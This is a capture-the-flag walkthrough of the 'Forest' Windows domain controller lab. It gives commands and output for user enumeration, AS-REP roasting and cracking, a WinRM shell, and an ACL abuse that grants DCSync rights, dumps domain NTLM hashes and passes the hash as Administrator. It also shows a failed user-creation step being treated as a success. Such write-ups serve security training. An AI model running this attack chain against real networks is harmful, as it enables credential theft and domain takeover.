# Machine name: Forest  
# Machine IP: 10.129.25.123  
# Type: Windows  
# Difficulty: Easy  
----
# Reconniance  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rustscan -a 10.129.25.123 -r 1-65535 -- -sV -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/faridd/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.25.123:53
Open 10.129.25.123:88
Open 10.129.25.123:135
Open 10.129.25.123:139
Open 10.129.25.123:389
Open 10.129.25.123:445
Open 10.129.25.123:464
Open 10.129.25.123:593
Open 10.129.25.123:636
Open 10.129.25.123:3269
Open 10.129.25.123:3268
Open 10.129.25.123:5985
Open 10.129.25.123:9389
Open 10.129.25.123:47001
Open 10.129.25.123:49668
Open 10.129.25.123:49665
Open 10.129.25.123:49666
Open 10.129.25.123:49664
Open 10.129.25.123:49671
Open 10.129.25.123:49677
Open 10.129.25.123:49676
Open 10.129.25.123:49681
Open 10.129.25.123:49698
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV -sC" on ip 10.129.25.123

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-27 14:34:55Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-04-27T07:35:51-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-27T14:35:47
|_  start_date: 2026-04-27T14:33:24
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43951/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60042/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51080/udp): CLEAN (Timeout)
|   Check 4 (port 63803/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
We have learned that:  
 * Domain name = "htb.local"  
 * FQDN: FOREST.htb.local  
 * OS: Windows Server 2016 Standard.  


Lets use **"rpcclient"** to get the users in that domain:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rpcclient -U "" 10.129.25.123 -N               
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 

```

The founded users:   
```bash
Administrator
Guest
krbtgt
DefaultAccount
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

----
# Initial Access  

Now, we can identify the users that are not required "Kerberos Pre-Authentication". Let's get their TGTs without writing any password. Then, we can crack the session key sent along the ticket to get the user's real password.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip 10.129.25.123
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ff22e2abc79aecd46f6652ec166fbd10$0730375600726eef13c36dc7d29accbe2e721348858ea4866fe1d0ce328299968609a5a2562042b7b077801f033d8a3b903e117574ce2e11171999b00b563974ea2fae4bdbfe0114922daaf5d74c76c9d825577d63c02591238e4c5044fbe121783c3cd270f363a9198fdac5e7ec62bcdc020cf01e45c6fc2e93c3ed74a6a3c072c13300d08f33e682ab4f78b6571e1d1d5af9ff31d954e2cf48dec7a9892071c523a8e9710aebc8e023a9021968b428a7d02ae7050cecc138f15d8e3de21941970037f6863aab14d60497c794ee2db52e6ed4b9060301d78e9d40e3a7a97a591dece093310a
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```
users.txt file contains the usernames that we have found from rpcclient. Now, we can crack the hash "svc-alfresco" user and get its password.   
```bash
echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:ff22e2abc79aecd46f66......66fbd10' > hash.txt
```
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:00 DONE (2026-04-27 19:14) 1.298g/s 5314Kp/s 5314Kc/s 5314KC/s s9036559b..s12111989
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

As you can remember 5985 port was open. The 5985 port (HTTP) və 5986 port (HTTPS) are directly related to winrm.    
So, we can connect to this user via evil-winrm.  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ evil-winrm -i 10.129.25.123 -u svc-alfresco -p s3rvice  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
```
Yeahh, we are svc-alfresco user right now.    

----
# Privilege Escalation  
Now, I wanna use **"bloodhound"**. BloodHound is an analytical tool used to visualize the complex and often hidden relationships within an Active Directory environment. It uses graph theory to reveal attack paths that would be impossible to find manually.    

```bash
bloodhound-python  -ns 10.129.25.123 -d htb.local -u svc-alfresco -p s3rvice -c All --zip
# Then,
./Bloodhound
```  
It will create a .zip file that we will use at bloodhound. I uploaded it and now, lets select the "Analysis --> Shortest Paths to Domain Admins from Owned Principals". It will show us a graph like this:      
  
<img width="1586" height="1456" alt="Screenshot From 2026-04-27 20-20-45" src="https://github.com/user-attachments/assets/3679acf0-bdf8-4ad5-8384-e85260eabd5b" />    

The main plan is:  
```bash
svc-alfresco
    ↓ (member of)
Service Accounts Group
    ↓ (member of)
Privileged IT Accounts Group
    ↓ (member of)
Account Operators Group
    ↓ (has GenericAll on)
Exchange Windows Permissions Group
    ↓ (has WriteDACL on)
HTB.LOCAL Domain
    ↓ (grants)
DCSync Rights → Dump NTLM hashes → Pass-the-Hash as Administrator
```
* GenericAll = "I own you, I can do anything to you"  
* WriteDACL = "I can rewrite your rules and give myself any permission I want"  

----
First of all, I will create a new domain user because I am a member of "Account Operators" group. Then, I will add this new user to the "Exchange Windows Permissions" group to escalate its privileges over the domain root.     
Next, I will use this group membership to grant my user DCSync rights by modifying the domain's Access Control List (ACL).     
After that, I willperform a DCSync attack using Impacket's secretdump to request and retrieve the NTLM hash of the Domain Administrator.  

Let's create our user:  
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user john abc123! /add /domain
net.exe : The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.
    + CategoryInfo          : NotSpecified: (The password do...y requirements.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

More help is available by typing NET HELPMSG 2245.
```
Now, add it into "Exchange Windows Permissions" group:   
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" john /add
```
I am the svc-alfresco user right now. But I want to give permission to the user john, right? I will do it with the help of Add-DomainObjectAcl, but there are some key points that we need to be careful about. In this command, we will use the -Credential parameter to show the system that: "We are the svc-alfresco user, but this command will be executed as the john user—because the john user is in the 'Exchange Windows Permissions' group and only he can give DCSync rights to himself. We cannot do it as the svc-alfresco user." Yeah, so I need to prove this user's identity to execute this command. But I cannot do it with a plain password. In PowerShell, many security commands do not allow us to send a password as a simple piece of text like 'abc123!'. So, we need to encrypt it. That is why we should create a "pass" variable beforehand.  

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)

```
The $cred variable is used to prove the user's full identity. We will use it when we write the Add-DomainObjectAcl command.  
  
I need PowerView because standard Windows commands do not allow me to modify complex Active Directory ACLs directly from the command line.      
PowerView provides specialized functions like Add-DomainObjectAcl, which are essential for granting the user's the DCSync rights required to escalate my privileges.     
Essentially, it acts as the bridge that allows me to turn my Account Operator status into full Domain Admin control.  
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```
I have already installed it to my own kali, so it was easy to upload.   
I have uploaded the script to the target machine, but I haven't imported it into the current session yet. In Windows, simply uploading a file is not enough; I need to use the Import-Module command to make its functions available in PowerShell.    
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1
```
Now, we can give DCSyn rights to my new domain user "john".   
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
```
After all of them, I can easily get the Administrator hash by this command:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ impacket-secretsdump htb.local/john:'abc123!'@10.129.25.123 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
```
Just access as Administrator and read the flag:  
```bash
evil-winrm -i 10.129.25.123 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
type C:\Users\Administrator\Desktop\root.txt
```













